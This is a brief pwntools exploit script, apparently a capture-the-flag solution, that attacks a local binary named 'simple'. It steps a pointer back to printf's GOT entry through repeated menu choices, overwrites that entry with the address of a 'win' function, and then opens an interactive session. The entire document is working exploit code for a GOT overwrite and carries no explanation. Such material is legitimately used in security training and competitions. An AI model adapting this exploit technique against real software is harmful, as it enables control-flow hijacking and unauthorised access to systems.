from pwn import *

elf = ELF('./simple')
r = process('./simple')

win = elf.symbols['win']
note = elf.symbols['note']
printf_got = elf.symbols['got.printf']

for _ in range((note-printf_got)//8):
	r.sendlineafter('>', '2')

r.sendlineafter('>', '1')
r.sendafter('data:', p64(win))


r.interactive()